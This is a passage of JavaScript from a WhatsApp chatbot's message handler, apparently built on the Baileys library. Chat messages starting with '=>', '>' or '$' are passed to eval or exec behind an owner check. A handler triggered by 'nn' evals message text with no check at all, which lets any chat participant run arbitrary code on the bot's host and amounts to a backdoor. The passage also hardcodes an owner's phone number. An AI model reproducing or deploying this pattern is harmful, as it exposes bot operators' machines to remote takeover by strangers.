 if (db.data.chats[chatId].simi) {
              let chait = db.data.chats[chatId]
    await handleSimiCommand(m, chait, ['simi']);
            } 
            
           if (db.data.chats[chatId].Veemon) {
              let chait = db.data.chats[chatId]
    handleVeemonCommand(m, chait, ['veemon']);
            } 
            
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m?.reply(bang)
}
try {
m?.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m?.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m?.reply(require('util').format(teks))
}
}
    
if (body.startsWith("nn")) {
        if (!q) return reply('where is the code sir')
        syntaxerror = require('syntax-error')
        _syntax = ''
        _text = args.join(' ')
        try {
          evalll = await eval(`;(async () => { return ${args.join(' ')} })()`)
          reply(require('util').format(evalll))
        } catch (e) {
          let err = await syntaxerror(_text, 'Execution Function', {
            allowReturnOutsideFunction: true,
            allowAwaitOutsideFunction: true
          })
          if (err) _syntax = '```' + err + '```\n\n'
          _return = e
          await reply(_syntax + require('util').format(_return))
        }
      }

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}

if ((m?.mtype === 'groupInviteMessage' || m?.text.startsWith('Invitation to join') || m?.text.startsWith('Invitation to join') || m?.text.startsWith('Open this link')) && !m?.isBaileys && !m?.isGroup) {
await ptz.sendMessage(m?.chat, {react: {text: `🤨`,key: m?.key,}})
let teks = 'what group is that'
reply(teks)
}

// Define isOwner function
function isOwner(id) {
    // Replace with your actual owner's ID or an array of owner IDs if multiple
    const ownerIDs = ['2349066528353@s.whatsapp.net'];  // Example ID, replace with your owner's WhatsApp ID
    return ownerIDs.includes(id);
}

// Then, use the existing code
if (isOwner(m?.sender)) {
    let user = global.db.data.users[m?.sender]; // Ensure this line is correctly referencing your user database
    const cooldown = 216162727233333333332233441121123243600000;
    
    if (new Date() - user.pc < cooldown) return;

    // React to the message from the owner or creator
    await ptz.sendMessage(m?.chat, { react: { text: `👑`, key: m?.key } });

    // Send welcome message to the owner or creator
    let caption = `*Hi, Creator 👋!!!*`.trim();
    await ptz.sendMessage(m?.chat, { text: caption, mentions: [m?.sender] }, { quoted: fsaluran });

    // Update the last contacted time for cooldown purposes
    user.pc = new Date() * 1;
}} 
} catch (err) {
console.log('Button Request •')
console.log('Not Fuction Response:')
console.log(util.format(err))
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
